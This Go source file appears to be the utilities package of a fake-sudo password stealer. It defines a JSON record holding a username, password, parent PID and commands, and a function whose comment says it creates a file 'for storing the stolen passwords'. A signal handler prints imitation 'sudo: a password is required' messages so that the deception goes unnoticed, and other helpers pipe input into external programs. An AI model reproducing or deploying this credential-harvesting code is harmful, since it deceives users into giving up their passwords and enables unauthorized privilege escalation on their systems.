package utils

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

type Stringer interface {
	~string
}

//Message struct to be written as JSON to passord file
type Message[T Stringer] struct {
	Username T         `json:"username,omitempty"`
	Password T         `json:"password,omitempty"`
	Ppid     int       `json:"ppid"`
	Commands []T       `json:"commands"`
	Time     time.Time `json:"startTime"`
}

//Error stores most possible errors and their solutions
type Error[T Stringer] struct {
	err      T
	hint     T
	Solution T
}

//Error makes Error struct fully implement the error type
func (err Error[T]) Error() string {
	return string(err.err)
}

//EncodeToJSON encode Message struct to json
//returns the json and error if any
func (msg *Message[T]) EncodeToJSON() (jsondata []byte) {
	jsondata, _ = json.Marshal(msg)
	return
}

//DecodeJSON decodes json data to Message type and returns error if any
func (msg *Message[T]) DecodeJSON(jsondata []byte) error {
	err := json.Unmarshal(jsondata, msg)
	if err != nil {
		msg = &Message[T]{Time: time.Now()}
		return &Error[string]{err: "File contents can't be converted or empty", hint: "", Solution: "Skip"}
	}
	return nil
}

//NewMessage returns pointer to a Message variable
func NewMessage(username string, password string, ppid int, commands []string, time time.Time) *Message[string] {
	msg := &Message[string]{Username: username, Password: password, Ppid: ppid, Commands: commands, Time: time}
	return msg
}

// FindDefaultShell returns user default shell
// or returns error if not found
func FindDefaultShell() (string, error) {
	if value, ok := os.LookupEnv("SHELL"); ok {
		arr := strings.Split(value, "/")
		return arr[len(arr)-1], nil

	}
	return "", &Error[string]{err: "Couldn't find default shell :)", hint: "set SHELL env to /bin/bash", Solution: "os.Setenv('SHELL','/bin/bash')"}
}

// FindUserName return current username of which the user is logged into
// or returns error if not found
func FindUserName() (hostname string, err error) {
	username := os.Getenv("USERNAME")
	if username == "" {
		return "", &Error[string]{err: "Couldn't find username", hint: "Nothing can be done", Solution: "Skip"}
	}
	return username, nil
}

// Append appends message into any given file, skips if the message already exists
// or returns error if file isn't found or immutable
func Append(message string, filename string) error {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_RDWR, 0666)
	defer file.Close()
	if err != nil {
		return &Error[string]{err: fmt.Sprintf("file: %s not found", filename), hint: fmt.Sprintf("Create %s with filemode %d", filename, 0666), Solution: filename}
	}
	_, err = file.WriteString("\n" + message)
	if err != nil {
		return &Error[string]{err: fmt.Sprintf("file: %s not found", filename), hint: fmt.Sprintf("Create %s with filemode %d", filename, 0666), Solution: filename}
	}
	return nil
}

//CreatePasswdFile creates a password file for storing the stolen passwords
//or returns error if any
func CreatePasswdFile(filename string) error {
	file, err := os.OpenFile(filename, os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
	defer file.Close()
	if err != nil {
		return &Error[string]{err: fmt.Sprintf("file: %s not found", filename), hint: fmt.Sprintf("Create %s with filemode %d", filename, 0666), Solution: filename}
	}
	return nil
}

//ReadPasswdfile reads file and returns lines of strings
//or returns error
func ReadPasswdfile(filename string) ([]string, error) {
	passwdfile, err := os.OpenFile(filename, os.O_RDONLY|os.O_CREATE, 0666)
	defer passwdfile.Close()
	if err != nil {
		return []string{}, &Error[string]{err: fmt.Sprintf("file: %s not found", filename), hint: fmt.Sprintf("Create %s with filemode %d", filename, 0666), Solution: filename}
	}
	scanner := bufio.NewScanner(passwdfile)
	scanner.Split(bufio.ScanLines)
	text := []string{}
	for scanner.Scan() {
		text = append(text, scanner.Text())
	}
	if len(text) != 0 {
		return text, nil
	}
	return []string{}, &Error[string]{err: "File contents is empty", hint: "No previous passwords was written", Solution: "Skip"}

}

//ExecuteWithIO executes an external program, supplying it with input and arguments
//returns the program's output or errors if any
func ExecuteWithIO(exename string, stdin string, arg ...string) (stdout bytes.Buffer, err error) {
	cmd := exec.Command(exename, arg...)
	cmd.Stdin = strings.NewReader(stdin)
	cmd.Stdout = &stdout
	err = cmd.Run()
	if err != nil {
		return stdout, &Error[string]{err: fmt.Sprintf("Couldn't execute %s", exename), Solution: "Skip", hint: "No executable found"}
	}
	return
}

//ExecutewithoutIO executes an external program, making the program's input and output the standard IO respectively
// supplying it's arguments only and returns errors if any
func ExecutewithoutIO(exename string, arg ...string) (err error) {
	var cmd *exec.Cmd
	if len(arg) == 0 {
		cmd = exec.Command(exename)
	} else {
		cmd = exec.Command(exename, arg...)
	}
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		return &Error[string]{
			err:      fmt.Sprintf("Couldn't execute %s", exename),
			Solution: "Skip",
			hint:     "No executable found",
		}
	}
	return

}

//SignalHandler handles most unix signals sent to the process
//excluding EOF which is sent by the Ctrl+D
func SignalHandler(sigs chan os.Signal, done chan<- string, shellname string, arr ...string) {
	signal.Notify(sigs, syscall.SIGINT, syscall.SIGTSTP, syscall.SIGQUIT, syscall.SIGPIPE)
	defer close(done)
	for {
		select {
		case sig := <-sigs:
			name, str := "", ""
			for _, v := range arr {
				str += v + " "
			}
			name = strings.Split(os.Args[0], "/")[len(strings.Split(os.Args[0], "/"))-1]
			func(signal os.Signal) {
				switch signal {
				// Ctrl+C
				case syscall.SIGINT:
					done <- "\nsudo: a password is required"
					return
				// Ctrl+\
				case syscall.SIGQUIT:
					done <- "\nsudo: a password is required"
					return
				case syscall.SIGPIPE:
					done <- "\nbroken pipe"
					return
				// Ctrl+Z
				case syscall.SIGTSTP:
					done <- fmt.Sprintf("\n\n%s: suspended %s ", shellname, name) + str
					return
				}
			}(sig)
		}
	}

}
